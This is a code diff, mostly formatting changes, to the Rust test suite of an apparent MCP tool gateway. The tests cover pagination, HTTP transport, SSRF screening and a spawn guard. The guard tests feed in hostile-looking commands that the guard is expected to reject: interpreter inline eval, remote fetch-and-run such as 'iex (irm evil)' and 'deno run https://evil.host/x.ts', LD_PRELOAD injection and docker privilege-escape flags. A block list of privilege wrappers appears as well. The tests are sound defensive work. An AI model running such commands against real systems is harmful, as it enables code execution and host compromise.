-        cwd_validation_error, empty_cwd_variables, expand_cwd, file_uri_to_path, resolve_command,
-        resolve_root_token, screen_resolved_addrs, screen_spawn_command, screen_spawn_env,
-        validate_cwd, CacheHint, CancelRegistry, DownstreamServer, MrtrRequest, ServerRequestAction,
+        cwd_validation_error, empty_cwd_variables, expand_cwd, fetch_paginated_list,
+        file_uri_to_path, protocol_meta_for, resolve_command, resolve_root_token,
+        screen_resolved_addrs, screen_spawn_command, screen_spawn_env, validate_cwd, CacheHint,
+        CancelRegistry, DownstreamServer, HttpTransport, MrtrRequest, ServerRequestAction,
         ServerRequestHandler, Transport, TransportError, MODERN_PROTOCOL_VERSION,
-        fetch_paginated_list, protocol_meta_for, HttpTransport,
         OAUTH_CLIENT_CREDENTIALS_EXTENSION,
     };
     use serde_json::{json, Value};
@@ -5207,18 +5352,12 @@ mod tests {
     }
 
     impl Transport for MrtrTransport {
-        fn request(
-            &mut self,
-            method: &str,
-            params: Value,
-        ) -> Result<Value, TransportError> {
+        fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
             self.requests
                 .lock()
                 .unwrap()
                 .push((method.to_string(), params));
-            self.responses
-                .pop_front()
-                .expect("scripted MRTR response")
+            self.responses.pop_front().expect("scripted MRTR response")
         }
 
         fn notify(&mut self, _method: &str, _params: Value) -> Result<(), TransportError> {
@@ -5295,7 +5434,10 @@ mod tests {
         assert_eq!(listed.items.len(), 2);
         assert!(!listed.cache_hint.is_public());
         let ttl = listed.cache_hint.remaining_ttl_ms();
-        assert!(ttl > 0 && ttl <= 30_000, "minimum page TTL should win: {ttl}");
+        assert!(
+            ttl > 0 && ttl <= 30_000,
+            "minimum page TTL should win: {ttl}"
+        );
     }
 
     #[test]
@@ -5349,8 +5491,7 @@ mod tests {
             Ok(json!({"resources":[{"uri":"one:"}],"nextCursor":"same"})),
             Ok(json!({"resources":[{"uri":"two:"}],"nextCursor":"same"})),
         ]);
-        let listed =
-            fetch_paginated_list(&mut transport, "resources/list", "resources").unwrap();
+        let listed = fetch_paginated_list(&mut transport, "resources/list", "resources").unwrap();
         assert_eq!(listed.items.len(), 2);
         assert_eq!(
             listed.warning.as_deref(),
@@ -5368,7 +5509,9 @@ mod tests {
             Ok(json!({"tools":[{"name":"two"}]})),
             Ok(json!({"resources":[{"uri":"one:"}],"nextCursor":"resources-2"})),
             Ok(json!({"resources":[{"uri":"two:"}]})),
-            Ok(json!({"resourceTemplates":[{"uriTemplate":"one://{id}"}],"nextCursor":"templates-2"})),
+            Ok(
+                json!({"resourceTemplates":[{"uriTemplate":"one://{id}"}],"nextCursor":"templates-2"}),
+            ),
             Ok(json!({"resourceTemplates":[{"uriTemplate":"two://{id}"}]})),
             Ok(json!({"prompts":[{"name":"one"}],"nextCursor":"prompts-2"})),
             Ok(json!({"prompts":[{"name":"two"}]})),
@@ -5391,7 +5534,9 @@ mod tests {
     fn incomplete_refresh_keeps_the_previous_complete_catalog() {
         let transport = PaginationTransport::new(vec![
             Ok(json!({"tools":[{"name":"partial"}],"nextCursor":"two"})),
-            Err(TransportError::Unavailable("page two timed out".to_string())),
+            Err(TransportError::Unavailable(
+                "page two timed out".to_string(),
+            )),
         ]);
         let mut server = DownstreamServer {
             id: "fixture".to_string(),
@@ -5412,7 +5557,9 @@ mod tests {
             caps_prompts: false,
             caps_completions: false,
             caps_extensions: serde_json::Map::new(),
-            era: super::Era::Legacy { version: super::PROTOCOL_VERSION.to_string() },
+            era: super::Era::Legacy {
+                version: super::PROTOCOL_VERSION.to_string(),
+            },
             modern_http: false,
             modern_resource_subscriptions: std::collections::HashSet::new(),
             server_handler: None,
@@ -5465,10 +5612,8 @@ mod tests {
     /// so legitimate full revocation is not stuck forever behind the guard.
     #[test]
     fn two_consecutive_empty_tool_refreshes_accept_wipe() {
-        let transport = PaginationTransport::new(vec![
-            Ok(json!({ "tools": [] })),
-            Ok(json!({ "tools": [] })),
-        ]);
+        let transport =
+            PaginationTransport::new(vec![Ok(json!({ "tools": [] })), Ok(json!({ "tools": [] }))]);
         let mut server = DownstreamServer {
             id: "fixture".to_string(),
             transport: Box::new(transport),
@@ -5591,7 +5736,9 @@ mod tests {
         let transport = PaginationTransport::new(vec![
             Ok(json!({"resources":[{"uri":"r:"}]})),
             Ok(json!({"resourceTemplates":[{"uriTemplate":"partial://{id}"}],"nextCursor":"two"})),
-            Err(TransportError::Unavailable("page two timed out".to_string())),
+            Err(TransportError::Unavailable(
+                "page two timed out".to_string(),
+            )),
         ]);
         let mut server = DownstreamServer {
             id: "fixture".to_string(),
@@ -5612,7 +5759,9 @@ mod tests {
             caps_prompts: false,
             caps_completions: false,
             caps_extensions: serde_json::Map::new(),
-            era: super::Era::Legacy { version: super::PROTOCOL_VERSION.to_string() },
+            era: super::Era::Legacy {
+                version: super::PROTOCOL_VERSION.to_string(),
+            },
             modern_http: false,
             modern_resource_subscriptions: std::collections::HashSet::new(),
             server_handler: None,
@@ -5762,7 +5911,10 @@ mod tests {
         let script_file = pid_file.with_extension("sh");
         std::fs::write(
             &script_file,
-            format!("sleep 60 &\necho $! > '{}'\nwait\n", pid_file.to_string_lossy()),
+            format!(
+                "sleep 60 &\necho $! > '{}'\nwait\n",
+                pid_file.to_string_lossy()
+            ),
         )
         .expect("write launcher script");
         let args = vec![script_file.to_string_lossy().into_owned()];
@@ -5811,7 +5963,10 @@ mod tests {
         // parallel test.
         let var = format!("TP_TEST_CWD_{}", std::process::id());
         std::env::set_var(&var, "abc");
-        assert_eq!(expand_cwd(&format!("/x/${{{var}}}/y")), PathBuf::from("/x/abc/y"));
+        assert_eq!(
+            expand_cwd(&format!("/x/${{{var}}}/y")),
+            PathBuf::from("/x/abc/y")
+        );
         std::env::remove_var(&var);
         // An unset var expands to empty; a literal path is unchanged.
         assert_eq!(expand_cwd("/x/${TP_UNSET_ZZZ}/y"), PathBuf::from("/x//y"));
@@ -5910,7 +6065,9 @@ mod tests {
         super::strip_gateway_control_env(&mut cmd, &empty);
         let overrides: Vec<_> = cmd.get_envs().collect();
         assert!(
-            overrides.iter().any(|(k, v)| *k == OsStr::new(&secret) && v.is_none()),
+            overrides
+                .iter()
+                .any(|(k, v)| *k == OsStr::new(&secret) && v.is_none()),
             "a CONDUIT_* var must be stripped from the child"
         );
         assert!(
@@ -5925,7 +6082,8 @@ mod tests {
         );
 
         // A server that sets a control-plane-prefixed var for itself keeps it.
-        let configured: HashSet<&str> = [secret.as_str(), secret_new.as_str()].into_iter().collect();
+        let configured: HashSet<&str> =
+            [secret.as_str(), secret_new.as_str()].into_iter().collect();
         let mut cmd2 = std::process::Command::new("true");
         super::strip_gateway_control_env(&mut cmd2, &configured);
         assert!(
@@ -5959,7 +6117,10 @@ mod tests {
         // What resolve_direct turns the above into.
         let rewritten = (
             r"C:\Program Files\nodejs\node.exe",
-            a(&[r"C:\cache\_npx\h\node_modules\toolport-mcp-servers\bin\cli.js", "vercel"]),
+            a(&[
+                r"C:\cache\_npx\h\node_modules\toolport-mcp-servers\bin\cli.js",
+                "vercel",
+            ]),
         );
 
         assert!(
@@ -5995,7 +6156,11 @@ mod tests {
 
         // A fixture npx cache holding one package whose entry just holds stdin open,
         // so the spawned child survives long enough to inspect the transport.
-        let pkg = root.join("_npx").join("hash").join("node_modules").join("srv");
+        let pkg = root
+            .join("_npx")
+            .join("hash")
+            .join("node_modules")
+            .join("srv");
         std::fs::create_dir_all(pkg.join("bin")).expect("fixture package");
         std::fs::write(
             pkg.join("package.json"),
@@ -6119,7 +6284,10 @@ mod tests {
         assert_eq!(resolve_root_token("", Some("/proj")), None);
         assert_eq!(resolve_root_token("   ", Some("/proj")), None);
         // ${ROOT} with a known root -> substituted.
-        assert_eq!(resolve_root_token("${ROOT}", Some("/home/u/proj")), Some("/home/u/proj".into()));
+        assert_eq!(
+            resolve_root_token("${ROOT}", Some("/home/u/proj")),
+            Some("/home/u/proj".into())
+        );
         assert_eq!(
             resolve_root_token("${ROOT}/sub", Some("/home/u/proj")),
             Some("/home/u/proj/sub".into())
@@ -6128,9 +6296,15 @@ mod tests {
         assert_eq!(resolve_root_token("${ROOT}/sub", None), None);
         // No ${ROOT} -> the trimmed config, regardless of root.
         assert_eq!(resolve_root_token("/plain", None), Some("/plain".into()));
-        assert_eq!(resolve_root_token("  /plain  ", Some("/proj")), Some("/plain".into()));
+        assert_eq!(
+            resolve_root_token("  /plain  ", Some("/proj")),
+            Some("/plain".into())
+        );
         // Composes with expand_cwd: an un-touched ${VAR} survives for expand_cwd.
-        assert_eq!(resolve_root_token("${ROOT}/${SUB}", Some("/proj")), Some("/proj/${SUB}".into()));
+        assert_eq!(
+            resolve_root_token("${ROOT}/${SUB}", Some("/proj")),
+            Some("/proj/${SUB}".into())
+        );
     }
 
     #[test]
@@ -6143,12 +6317,21 @@ mod tests {
         let as_path = |u: &str| file_uri_to_path(u).map(PathBuf::from);
         #[cfg(not(windows))]
         {
-            assert_eq!(as_path("file:///home/u/proj"), Some(PathBuf::from("/home/u/proj")));
-            assert_eq!(as_path("file:///home/u/my%20proj"), Some(PathBuf::from("/home/u/my proj")));
+            assert_eq!(
+                as_path("file:///home/u/proj"),
+                Some(PathBuf::from("/home/u/proj"))
+            );
+            assert_eq!(
+                as_path("file:///home/u/my%20proj"),
+                Some(PathBuf::from("/home/u/my proj"))
+            );
         }
         #[cfg(windows)]
         {
-            assert_eq!(as_path("file:///C:/Users/u/proj"), Some(PathBuf::from(r"C:\Users\u\proj")));
+            assert_eq!(
+                as_path("file:///C:/Users/u/proj"),
+                Some(PathBuf::from(r"C:\Users\u\proj"))
+            );
             assert_eq!(
                 as_path("file:///C:/Users/u/my%20proj"),
                 Some(PathBuf::from(r"C:\Users\u\my proj"))
@@ -6341,7 +6524,11 @@ mod tests {
             .call_with_cancel_and_mrtr("echo", json!({}), None, Some(&meta), None)
             .unwrap();
         assert_eq!(incomplete["resultType"], "input_required");
-        assert_eq!(handled.load(Ordering::SeqCst), 0, "native MRTR is not shimmed");
+        assert_eq!(
+            handled.load(Ordering::SeqCst),
+            0,
+            "native MRTR is not shimmed"
+        );
 
         let retry = MrtrRequest {
             input_responses: Some(json!({
@@ -6413,14 +6600,15 @@ mod tests {
             }
             assert!(body.contains("\"id\":99"));
             inline
-                .write_all(b"HTTP/1.1 202 Accepted\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}")
+                .write_all(
+                    b"HTTP/1.1 202 Accepted\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}",
+                )
                 .unwrap();
 
             let line2 = "data: {\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"ok\":true}}\n";
             write_chunk(&mut sse, line2.as_bytes());
             sse.write_all(b"0\r\n\r\n").unwrap();
         });
-
 
         fn read_http_headers(r: &mut impl Read) -> Vec<u8> {
             let mut req_buf = Vec::new();
@@ -6437,7 +6625,10 @@ mod tests {
         fn content_length(headers: &[u8]) -> Option<usize> {
             let headers = String::from_utf8_lossy(headers);
             for line in headers.lines() {
-                if let Some(v) = line.strip_prefix("Content-Length:").or_else(|| line.strip_prefix("content-length:")) {
+                if let Some(v) = line
+                    .strip_prefix("Content-Length:")
+                    .or_else(|| line.strip_prefix("content-length:"))
+                {
                     return v.trim().parse().ok();
                 }
             }
@@ -6473,8 +6664,7 @@ mod tests {
                 Ok(None)
             }
         }));
-        let mut t =
-            HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
+        let mut t = HttpTransport::with_auth_refresh(&url, Some("stale".to_string()), refresh);
         t.set_server_request_handler(handler);
         let result = t
             .post(
@@ -6566,7 +6756,10 @@ mod tests {
                 .then_some(ServerRequestAction::InputRequired)
         }));
         let first = transport
-            .request("tools/call", json!({ "name": "interactive", "arguments": {} }))
+            .request(
+                "tools/call",
+                json!({ "name": "interactive", "arguments": {} }),
+            )
             .expect("first round");
         assert_eq!(first["resultType"], "input_required");
         let state = first["requestState"].clone();
@@ -6589,7 +6782,6 @@ mod tests {
         assert_eq!(final_result, json!({ "ok": true }));
         server.join().unwrap();
     }
-
 
     #[test]
     fn ssrf_resolver_screens_resolved_addresses() {
@@ -6678,9 +6870,13 @@ mod tests {
         assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
         assert!(screen_spawn_command("python3", &argv(&["/opt/app/main.py"])).is_ok());
         // A docker server without escape flags is fine.
-        assert!(screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok());
+        assert!(
+            screen_spawn_command("docker", &argv(&["run", "-i", "--rm", "ghcr.io/x/y"])).is_ok()
+        );
         // Non-host docker network must NOT be a false positive.
-        assert!(screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok());
+        assert!(
+            screen_spawn_command("docker", &argv(&["run", "--network", "mynet", "img"])).is_ok()
+        );
         // A plain binary server.
         assert!(screen_spawn_command("/usr/local/bin/my-mcp", &argv(&["--stdio"])).is_ok());
     }
@@ -6689,7 +6885,9 @@ mod tests {
     fn spawn_guard_blocks_interpreter_inline_eval() {
         assert!(screen_spawn_command("node", &argv(&["-e", "require('child_process')"])).is_err());
         assert!(screen_spawn_command("node", &argv(&["--eval", "x"])).is_err());
-        assert!(screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err());
+        assert!(
+            screen_spawn_command("node", &argv(&["--require", "./pwn.js", "server.js"])).is_err()
+        );
         assert!(screen_spawn_command("node", &argv(&["--import=./pwn.js", "server.js"])).is_err());
         assert!(screen_spawn_command("deno", &argv(&["eval", "-e", "x"])).is_err());
         assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
@@ -6722,8 +6920,14 @@ mod tests {
     fn spawn_guard_blocks_container_escape() {
         // Privilege escalation beyond a normal host process is blocked.
         assert!(screen_spawn_command("docker", &argv(&["run", "--privileged", "img"])).is_err());
-        assert!(screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"])).is_err());
-        assert!(screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"])).is_err());
+        assert!(
+            screen_spawn_command("podman", &argv(&["run", "--cap-add", "SYS_ADMIN", "img"]))
+                .is_err()
+        );
+        assert!(
+            screen_spawn_command("docker", &argv(&["run", "--device", "/dev/kmsg", "img"]))
+                .is_err()
+        );
         // Host namespaces in both `=host` and space forms.
         assert!(screen_spawn_command("docker", &argv(&["run", "--network=host", "img"])).is_err());
         assert!(screen_spawn_command("docker", &argv(&["run", "--pid", "host", "img"])).is_err());
@@ -6733,16 +6937,28 @@ mod tests {
     fn spawn_guard_allows_docker_volume_mounts() {
         // A plain host mount is NOT an escalation beyond the full host access npx/binary
         // servers already have, so it must not false-positive on legit docker servers.
-        assert!(screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok());
-        assert!(screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"])).is_ok());
-        assert!(screen_spawn_command("docker", &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])).is_ok());
+        assert!(
+            screen_spawn_command("docker", &argv(&["run", "-v", "/data:/data", "img"])).is_ok()
+        );
+        assert!(
+            screen_spawn_command("docker", &argv(&["run", "--volume", "/data:/data", "img"]))
+                .is_ok()
+        );
+        assert!(screen_spawn_command(
+            "docker",
+            &argv(&["run", "--mount", "type=bind,src=/data,dst=/d", "img"])
+        )
+        .is_ok());
     }
 
     #[test]
     fn spawn_guard_is_case_and_path_insensitive() {
         // A full path and odd casing must still resolve to the interpreter name.
         assert!(screen_spawn_command("/usr/bin/node", &argv(&["-e", "x"])).is_err());
-        assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
+        assert!(
+            screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"]))
+                .is_err()
+        );
         // A non-interpreter that merely has a `-e`-looking arg is untouched.
         assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
     }
@@ -6752,9 +6968,24 @@ mod tests {
         // Wrapper programs run the REAL command from their args, which would bypass the
         // basename dispatch. Refused outright, in any path form.
         for w in [
-            "sudo", "doas", "su", "runuser", "pkexec", "time", "nice", "nohup", "xargs",
-            "stdbuf", "timeout", "flock", "busybox", "proxychains", "chroot", "capsh",
-            "firejail", "wine",
+            "sudo",
+            "doas",
+            "su",
+            "runuser",
+            "pkexec",
+            "time",
+            "nice",
+            "nohup",
+            "xargs",
+            "stdbuf",
+            "timeout",
+            "flock",
+            "busybox",
+            "proxychains",
+            "chroot",
+            "capsh",
+            "firejail",
+            "wine",
         ] {
             assert!(
                 screen_spawn_command(w, &argv(&["node", "-e", "evil()"])).is_err(),
@@ -6777,7 +7008,10 @@ mod tests {
         // Value-taking flags swallow the rest of the token and must NOT be read as an eval
         // (no false positives on real invocations).
         assert!(screen_spawn_command("python", &argv(&["-mhttp.server"])).is_ok());
-        assert!(screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"])).is_ok());
+        assert!(
+            screen_spawn_command("python", &argv(&["-Wignore::DeprecationWarning", "a.py"]))
+                .is_ok()
+        );
         assert!(screen_spawn_command("bash", &argv(&["-o", "pipefail", "script.sh"])).is_ok());
         assert!(screen_spawn_command("ruby", &argv(&["-Ilib", "app.rb"])).is_ok());
         assert!(screen_spawn_command("perl", &argv(&["-Ilib", "app.pl"])).is_ok());
@@ -6790,10 +7024,17 @@ mod tests {
     #[test]
     fn spawn_guard_closes_deno_bun_basename_and_env_bypasses() {
         // deno/bun: a value-taking flag before the subcommand can't hide a remote fetch-exec.
-        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        assert!(
+            screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"]))
+                .is_err()
+        );
         assert!(screen_spawn_command("deno", &argv(&["run", "https://evil.ts"])).is_err());
-        assert!(screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err());
-        assert!(screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err());
+        assert!(
+            screen_spawn_command("deno", &argv(&["run", "data:text/javascript,alert(1)"])).is_err()
+        );
+        assert!(
+            screen_spawn_command("bun", &argv(&["--cwd", "/x", "run", "https://evil"])).is_err()
+        );
         // A local deno run stays allowed.
         assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts"])).is_ok());
         // Multi-dot / versioned interpreter names still dispatch to the interpreter family.
@@ -6817,11 +7058,26 @@ mod tests {
         assert!(screen_spawn_command("py", &argv(&["-3.11", "-c", "x"])).is_err());
         assert!(screen_spawn_command("py", &argv(&["-3.11", "script.py"])).is_ok());
         // A global value option can't hide the deno eval subcommand.
-        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "eval", "Deno.exit()"])).is_err());
-        assert!(screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"])).is_err());
+        assert!(screen_spawn_command(
+            "deno",
+            &argv(&["--config", "d.json", "eval", "Deno.exit()"])
+        )
+        .is_err());
+        assert!(
+            screen_spawn_command("deno", &argv(&["--config", "d.json", "run", "npm:evil"]))
+                .is_err()
+        );
         // Only the executable target is remote-checked; a URL passed as an app arg is fine.
-        assert!(screen_spawn_command("deno", &argv(&["run", "./server.ts", "--url", "https://api.example.com"])).is_ok());
-        assert!(screen_spawn_command("bun", &argv(&["run", "server.ts", "--url", "https://api.example.com"])).is_ok());
+        assert!(screen_spawn_command(
+            "deno",
+            &argv(&["run", "./server.ts", "--url", "https://api.example.com"])
+        )
+        .is_ok());
+        assert!(screen_spawn_command(
+            "bun",
+            &argv(&["run", "server.ts", "--url", "https://api.example.com"])
+        )
+        .is_ok());
         // `--` ends interpreter options, so a cluster-shaped APP arg after it isn't screened.
         assert!(screen_spawn_command("python", &argv(&["server.py", "--", "-Ec"])).is_ok());
     }
@@ -6835,7 +7091,10 @@ mod tests {
         assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "-e", "evil()"])).is_err());
         assert!(screen_spawn_command("env", &argv(&["python", "-c", "x"])).is_err());
         // ...and a code-injecting assignment is caught (screened like the env field).
-        assert!(screen_spawn_command("env", &argv(&["LD_PRELOAD=/tmp/pwn.so", "node", "s.js"])).is_err());
+        assert!(
+            screen_spawn_command("env", &argv(&["LD_PRELOAD=/tmp/pwn.so", "node", "s.js"]))
+                .is_err()
+        );
         // env with its own flags is unusual and fails closed.
         assert!(screen_spawn_command("env", &argv(&["-S", "node -e evil()"])).is_err());
         assert!(screen_spawn_command("env", &argv(&["-u", "PATH", "node", "-e", "x"])).is_err());
@@ -6861,7 +7120,9 @@ mod tests {
 
     #[test]
     fn spawn_guard_blocks_more_interpreters_and_shells() {
-        assert!(screen_spawn_command("osascript", &argv(&["-e", "do shell script \"x\""])).is_err());
+        assert!(
+            screen_spawn_command("osascript", &argv(&["-e", "do shell script \"x\""])).is_err()
+        );
         assert!(screen_spawn_command("elixir", &argv(&["-e", "System.cmd(0,0)"])).is_err());
         assert!(screen_spawn_command("lua", &argv(&["-e", "os.execute('x')"])).is_err());
         assert!(screen_spawn_command("Rscript", &argv(&["-e", "system('x')"])).is_err());
@@ -6887,7 +7148,9 @@ mod tests {
         assert!(screen_spawn_command("pwsh.exe", &argv(&["-c", "iex (irm evil)"])).is_err());
         // A real script and benign switches are allowed (no over-blocking).
         assert!(screen_spawn_command("pwsh", &argv(&["-File", "server.ps1"])).is_ok());
-        assert!(screen_spawn_command("pwsh", &argv(&["-NoProfile", "-File", "server.ps1"])).is_ok());
+        assert!(
+            screen_spawn_command("pwsh", &argv(&["-NoProfile", "-File", "server.ps1"])).is_ok()
+        );
         assert!(screen_spawn_command(
             "pwsh",
             &argv(&["-ExecutionPolicy", "Bypass", "-File", "s.ps1"])
@@ -6899,7 +7162,9 @@ mod tests {
     fn spawn_guard_blocks_deno_eval_and_remote_run() {
         // Deno's lethal invocations are SUBCOMMANDS, not flags.
         assert!(screen_spawn_command("deno", &argv(&["eval", "Deno.exit()"])).is_err());
-        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "https://evil.host/x.ts"])).is_err());
+        assert!(
+            screen_spawn_command("deno", &argv(&["run", "-A", "https://evil.host/x.ts"])).is_err()
+        );
         // A normal local `deno run` is allowed.
         assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
     }
@@ -6908,7 +7173,9 @@ mod tests {
     fn spawn_guard_blocks_node_attached_require() {
         // `-r<module>` attached (no `=`) previously slipped the equality check.
         assert!(screen_spawn_command("node", &argv(&["-r./pwn.js", "server.js"])).is_err());
-        assert!(screen_spawn_command("node", &argv(&["--loader", "./pwn.mjs", "server.js"])).is_err());
+        assert!(
+            screen_spawn_command("node", &argv(&["--loader", "./pwn.mjs", "server.js"])).is_err()
+        );
         assert!(screen_spawn_command("node", &argv(&["dist/server.js"])).is_ok());
     }
 
@@ -7212,7 +7479,9 @@ mod tests {
             "  {\"jsonrpc\":\"2.0\",\"method\":\"notifications/tools/list_changed\"}\n"
         ));
         // A response to our own tools/list call is not the notification.
-        assert!(!is_list_changed(r#"{"jsonrpc":"2.0","id":3,"result":{"tools":[]}}"#));
+        assert!(!is_list_changed(
+            r#"{"jsonrpc":"2.0","id":3,"result":{"tools":[]}}"#
+        ));
         // Other notifications and unrelated lines are ignored (and skip the parse).
         assert!(!is_list_changed(
             r#"{"jsonrpc":"2.0","method":"notifications/message","params":{}}"#
@@ -7235,9 +7504,7 @@ mod tests {
             change::RESOURCES
         );
         assert_eq!(
-            list_changed_kind(
-                r#"{"jsonrpc":"2.0","method":"notifications/prompts/list_changed"}"#
-            ),
+            list_changed_kind(r#"{"jsonrpc":"2.0","method":"notifications/prompts/list_changed"}"#),
             change::PROMPTS
         );
         // resources/updated is a different notification, not a list change.
@@ -7264,20 +7531,44 @@ mod tests {
 
         // Unarmed (still in the handshake window): the line is forwarded but the
         // change is not acted on.
-        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
+        assert!(forward_line(
+            notif.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &no_progress
+        ));
         assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), 0);
         assert_eq!(rx.recv().unwrap(), notif);
 
         // Armed: the same notification now sets the TOOLS bit.
         armed.store(true, Ordering::SeqCst);
-        assert!(forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
-        assert_eq!(dirty.as_ref().unwrap().load(Ordering::SeqCst), change::TOOLS);
+        assert!(forward_line(
+            notif.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &no_progress
+        ));
+        assert_eq!(
+            dirty.as_ref().unwrap().load(Ordering::SeqCst),
+            change::TOOLS
+        );
         assert_eq!(rx.recv().unwrap(), notif);
 
         // A resources/list_changed sets the RESOURCES bit alongside it (OR, not
         // overwrite), so distinct changes between watcher ticks aren't lost.
         let res_notif = r#"{"jsonrpc":"2.0","method":"notifications/resources/list_changed"}"#;
-        assert!(forward_line(res_notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
+        assert!(forward_line(
+            res_notif.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &no_progress
+        ));
         assert_eq!(
             dirty.as_ref().unwrap().load(Ordering::SeqCst),
             change::TOOLS | change::RESOURCES
@@ -7287,13 +7578,27 @@ mod tests {
         // An ordinary line is always forwarded and never flags a change.
         let resp = r#"{"jsonrpc":"2.0","id":1,"result":{}}"#;
         let dirty2 = Some(Arc::new(AtomicU8::new(0)));
-        assert!(forward_line(resp.to_string(), &tx, &dirty2, &armed, &no_sink, &no_progress));
+        assert!(forward_line(
+            resp.to_string(),
+            &tx,
+            &dirty2,
+            &armed,
+            &no_sink,
+            &no_progress
+        ));
         assert_eq!(dirty2.as_ref().unwrap().load(Ordering::SeqCst), 0);
         assert_eq!(rx.recv().unwrap(), resp);
 
         // A closed receiver makes forward_line report "stop".
         drop(rx);
-        assert!(!forward_line(notif.to_string(), &tx, &dirty, &armed, &no_sink, &no_progress));
+        assert!(!forward_line(
+            notif.to_string(),
+            &tx,
+            &dirty,
+            &armed,
+            &no_sink,
+            &no_progress
+        ));
     }
 
     #[test]
@@ -7313,7 +7618,10 @@ mod tests {
             ),
             None
         );
-        assert_eq!(resource_updated_uri(r#"{"jsonrpc":"2.0","id":1,"result":{}}"#), None);
+        assert_eq!(
+            resource_updated_uri(r#"{"jsonrpc":"2.0","id":1,"result":{}}"#),
+            None
+        );
         assert_eq!(resource_updated_uri("not json"), None);
     }
 
@@ -7326,8 +7634,11 @@ mod tests {
         assert!(!TransportError::Rpc(json!({ "code": -32601 })).is_health_failure());
         assert!(!TransportError::Fatal("HTTP 400".into()).is_health_failure());
         assert!(TransportError::Unavailable("timed out".into()).is_health_failure());
-        assert!(TransportError::Retry { retry_after: None, message: "429".into() }
-            .is_health_failure());
+        assert!(TransportError::Retry {
+            retry_after: None,
+            message: "429".into()
+        }
+        .is_health_failure());
     }
 
     #[test]
@@ -7372,12 +7683,17 @@ mod tests {
             MODERN_PROTOCOL_VERSION,
             "a modern connection stamps its version on notifications too, got {sent}"
         );
-        assert_eq!(sent["params"]["requestId"], 1, "the caller's params survive");
+        assert_eq!(
+            sent["params"]["requestId"], 1,
+            "the caller's params survive"
+        );
     }
 
     #[test]
     fn modern_http_listener_routes_tagged_notifications() {
-        use super::{change, HttpTransport, SubscriptionFilter, Transport, MODERN_PROTOCOL_VERSION};
+        use super::{
+            change, HttpTransport, SubscriptionFilter, Transport, MODERN_PROTOCOL_VERSION,
+        };
         use std::sync::atomic::{AtomicU8, Ordering};
         use std::sync::{Arc, Mutex};
 
@@ -7388,7 +7704,10 @@ mod tests {
         let handle = std::thread::spawn(move || {
             let mut request = server.recv().unwrap();
             let mut request_body = String::new();
-            request.as_reader().read_to_string(&mut request_body).unwrap();
+            request
+                .as_reader()
+                .read_to_string(&mut request_body)
+                .unwrap();
             *captured.lock().unwrap() = request_body;
             let subscription = json!({
                 "io.modelcontextprotocol/subscriptionId": 1
@@ -7411,11 +7730,9 @@ mod tests {
                     "params": { "uri": "fixture://one", "_meta": subscription }
                 })
             );
-            let content_type = tiny_http::Header::from_bytes(
-                &b"Content-Type"[..],
-                &b"text/event-stream"[..],
-            )
-            .unwrap();
+            let content_type =
+                tiny_http::Header::from_bytes(&b"Content-Type"[..], &b"text/event-stream"[..])
+                    .unwrap();
             request
                 .respond(tiny_http::Response::from_string(stream).with_header(content_type))
                 .unwrap();
@@ -7440,8 +7757,7 @@ mod tests {
             .unwrap();
         handle.join().unwrap();
         for _ in 0..100 {
-            if dirty.load(Ordering::SeqCst) == change::TOOLS
-                && !updates.lock().unwrap().is_empty()
+            if dirty.load(Ordering::SeqCst) == change::TOOLS && !updates.lock().unwrap().is_empty()
             {
                 break;
             }
@@ -7534,7 +7850,10 @@ mod tests {
 
         assert_eq!(
             seen_auth.lock().unwrap().as_slice(),
-            &["Bearer old-token".to_string(), "Bearer step-up-token".to_string()]
+            &[
+                "Bearer old-token".to_string(),
+                "Bearer step-up-token".to_string()
+            ]
         );
         assert_eq!(
             challenged_scope.lock().unwrap().as_str(),
@@ -7593,12 +7912,22 @@ mod tests {
         server.subscribe_resource("fixture://z").unwrap();
         server.subscribe_resource("fixture://a").unwrap();
         assert_eq!(
-            filters.lock().unwrap().last().unwrap().resource_subscriptions,
+            filters
+                .lock()
+                .unwrap()
+                .last()
+                .unwrap()
+                .resource_subscriptions,
             vec!["fixture://a".to_string(), "fixture://z".to_string()]
         );
         server.unsubscribe_resource("fixture://z").unwrap();
         assert_eq!(
-            filters.lock().unwrap().last().unwrap().resource_subscriptions,
+            filters
+                .lock()
